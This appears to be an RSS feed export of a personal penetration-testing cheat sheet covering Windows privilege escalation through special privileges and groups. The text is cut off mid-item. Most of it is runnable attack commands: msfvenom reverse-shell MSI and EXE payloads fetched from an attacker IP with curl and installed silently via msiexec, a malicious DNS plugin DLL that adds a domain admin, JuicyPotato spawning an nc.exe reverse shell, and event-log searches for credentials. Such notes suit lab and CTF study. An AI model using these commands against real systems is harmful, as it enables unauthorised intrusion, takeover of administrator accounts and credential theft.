    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/</guid>
      <description>&lt;h1 id=&#34;check-permission&#34;&gt;Check permission&lt;a class=&#34;anchor&#34; href=&#34;#check-permission&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# should return 0x1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get-applockerpolicy -effective | select -expandproperty rulecollections&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;revshell&#34;&gt;Revshell&lt;a class=&#34;anchor&#34; href=&#34;#revshell&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.14.17 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9191&lt;/span&gt; -f msi -o revshell.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.14.&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;/revshell.msi -o revshell.msi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msiexec /quiet /qn /norestart /i .\revshell.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;elevate-current-user-to-admin&#34;&gt;Elevate current user to admin&lt;a class=&#34;anchor&#34; href=&#34;#elevate-current-user-to-admin&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/x64/exec cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net localgroup Administrators &amp;lt;current_user&amp;gt; /add&amp;#39;&lt;/span&gt; -f msi -o adduser.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.14.&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;/adduser.msi -o adduser.msi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msiexec /quiet /qn /norestart /i .\adduser.msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;This group&amp;rsquo;s member have access to DNS record, and can do DLL injection on the DNS server&#xA;In a lot of case, the domain controller is the DNS server. And DNS server usually run with &lt;code&gt;NT AUTHORITY/SYSTEM&lt;/code&gt; privilege&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;dll-injection&#34;&gt;DLL injection&lt;a class=&#34;anchor&#34; href=&#34;#dll-injection&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Generate a malicious dll&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/x64/exec cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net group &amp;#34;domain admins&amp;#34; netadm /add /domain&amp;#39;&lt;/span&gt; -f dll -o adduser.dll&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Move the dll to the target machine and do this:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;After this, you have to wait until the DNS server is restarted for it to load the dll&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Window&amp;rsquo;s built in group&#xA;Able to read event log&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;wevutilexe&#34;&gt;&lt;code&gt;Wevutil.exe&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wevutilexe&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Since windows commands usually have an option to pass credentials into the command line, we can try to search for them in event log&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wevtutil qe Security /rd:true /f:text | Select-String &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/user&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we have a reverse shell or situations where above command doesn&amp;rsquo;t work, we can pass credential into &lt;code&gt;wevutil&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr &amp;#34;/user&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;get-winevent&#34;&gt;&lt;code&gt;Get-WinEvent&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#get-winevent&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-WinEvent -LogName security | where { $_.ID &lt;span style=&#34;color:#f92672&#34;&gt;-eq&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4688&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-and&lt;/span&gt; $_.Properties[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;].Value &lt;span style=&#34;color:#f92672&#34;&gt;-like&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*/user*&amp;#39;&lt;/span&gt;} | Select-Object @{name=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CommandLine&amp;#39;&lt;/span&gt;;expression={ $_.Properties[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;].Value }}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Note: Since Windows 10 Version 1803, the &amp;ldquo;SeLoadDriverPrivilege&amp;rdquo; is not exploitable, as it is no longer possible to include references to registry keys under &amp;ldquo;HKEY_CURRENT_USER&amp;rdquo;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;check-privilege&#34;&gt;Check privilege&lt;a class=&#34;anchor&#34; href=&#34;#check-privilege&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;You must have &lt;code&gt;SeLoadDriverPrivilege&lt;/code&gt;. If not, do UAC bypass &lt;a href=&#34;https://github.com/hfiref0x/UACME&#34;&gt;UACMe&lt;/a&gt; or if on a GUI, run with administrator privilege&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whoami /priv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;load-capcomsys&#34;&gt;Load &lt;code&gt;Capcom.sys&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#load-capcomsys&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;manual&#34;&gt;Manual&lt;a class=&#34;anchor&#34; href=&#34;#manual&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;This driver allows code execution. We use &lt;a href=&#34;https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp&#34;&gt;this tool&lt;/a&gt; to load it.&lt;/p&gt;&#xA;&lt;p&gt;First, download the tool&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Replace all the &lt;code&gt;#include&lt;/code&gt; headers with these instead&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Built-in group in windows&#xA;Allows you to copy a file, and be able to read it&#xA;!IMPORTANT: if copying &lt;code&gt;NTDS.dit&lt;/code&gt;, make sure to create a shadow volume first, head to  &lt;code&gt;7. Lateral Movement/DCSync&lt;/code&gt; for more detail&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h2 id=&#34;sebackupprivilege&#34;&gt;SeBackupPrivilege&lt;a class=&#34;anchor&#34; href=&#34;#sebackupprivilege&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/giuliano108/SeBackupPrivilege&#34;&gt;Github page&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;This repo contains 2 &lt;code&gt;.dll&lt;/code&gt; that you can use to enable and use the privilege of backup operators&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module .\SeBackupPrivilegeUtils.dll&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module .\SeBackupPrivilegeCmdLets.dll&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;View privilege&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whoami /priv&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-SeBackupPrivilege&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Enable &lt;code&gt;SeBackupPrivilege&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/</guid>
      <description>&lt;h1 id=&#34;extract-credential-from-lsassexe&#34;&gt;Extract credential from &lt;code&gt;lsass.exe&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#extract-credential-from-lsassexe&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;See &lt;a href=&#34;https://ag2s.ca/spellbook/07.-credential-looting/dump-lsass/&#34;&gt;Dump LSASS&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;rce-as-system&#34;&gt;RCE as SYSTEM&lt;a class=&#34;anchor&#34; href=&#34;#rce-as-system&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/decoder-it/psgetsystem&#34;&gt;Github page&lt;/a&gt;&lt;/p&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;The exploit elevate us to &lt;code&gt;SYSTEM&lt;/code&gt; privilege by launching a child process, then use the &lt;code&gt;SeDebugPrivilege&lt;/code&gt; to make the child process inherit the token of a &lt;code&gt;SYSTEM&lt;/code&gt; process and impersonate it&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;p&gt;Download the exploit script and transfer to target machine&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we choose a process running as &lt;code&gt;SYSTEM&lt;/code&gt;. &lt;code&gt;winlogon.exe&lt;/code&gt; is a good choice.&lt;/p&gt;&#xA;&lt;p&gt;Copy the PID&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tasklist&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run exploit&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;&lt;code&gt;JuicyPotato&lt;/code&gt; doesn&amp;rsquo;t work on Windows Server 2019 and Windows 10 build 1809 onwards. In that case, use &lt;code&gt;PrintSpoofer&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;juicypotato&#34;&gt;JuicyPotato&lt;a class=&#34;anchor&#34; href=&#34;#juicypotato&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Can be use with either &lt;code&gt;SeImpersonate&lt;/code&gt; or &lt;code&gt;SeAssignPrimaryToken&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/ohpe/juicy-potato&#34;&gt;Github page&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Download and transfer this binary to target machine, maybe also transfer &lt;code&gt;nc.exe&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Query &lt;code&gt;CLSID&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKCR\CLSID /s /f LocalService&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run this. &lt;code&gt;-c&lt;/code&gt; flag is the &lt;code&gt;CLSID&lt;/code&gt; we got from command above&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\JuicyPotato.exe -l 53375 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{8BC3F05E-D86B-11D0-A075-00C04FB68820}&amp;#34;&lt;/span&gt; -p c:\windows\system32\cmd.exe -a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/c c:\Windows\TEMP\nc.exe 10.10.14.57 9001 -e cmd.exe&amp;#34;&lt;/span&gt; -t *&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or, if you don&amp;rsquo;t wanna use &lt;code&gt;nc.exe&lt;/code&gt;, go to &lt;a href=&#34;https://www.revshells.com&#34;&gt;revshells&lt;/a&gt; and get a &lt;code&gt;powershell base64&lt;/code&gt; revshell command&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;We will change a service&amp;rsquo;s &lt;code&gt;imagepath&lt;/code&gt;. This service has to run as &lt;code&gt;NT Authority\system&lt;/code&gt; or &lt;code&gt;Administrator&lt;/code&gt;(very rare), and has to be able to be start/stop by normal user. One candidate is &lt;code&gt;SecLogon&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;query-image-path&#34;&gt;Query image path&lt;a class=&#34;anchor&#34; href=&#34;#query-image-path&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Save the output. This is a destructive attack, so we have to revert our modification.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query hklm\SYSTEM\CurrentControlSet\Services\SecLogon /v imagepath&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;generate-revshell&#34;&gt;Generate revshell&lt;a class=&#34;anchor&#34; href=&#34;#generate-revshell&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;attacker_ip&amp;gt; LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&gt; -f exe -o shell.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After this, upload the executable to target machine at &lt;code&gt;C:\windows\Temp&lt;/code&gt; or any location you want&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/</guid>
      <description>&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Choose a service that run as &lt;code&gt;SYSTEM&lt;/code&gt;, like &lt;code&gt;AppReadiness&lt;/code&gt;. We can query service info like this.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc qc AppReadiness&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Remember to note down the &lt;code&gt;BINARY_PATH_NAME&lt;/code&gt;, we will modify it, so when cleaning up we need to reverse the process&lt;/p&gt;&#xA;&lt;h2 id=&#34;check-permission&#34;&gt;Check permission&lt;a class=&#34;anchor&#34; href=&#34;#check-permission&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Download &lt;a href=&#34;https://learn.microsoft.com/en-us/sysinternals/downloads/psservice&#34;&gt;PsService&lt;/a&gt; and transfer to target machine. This binary is from sysinternal suite&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; 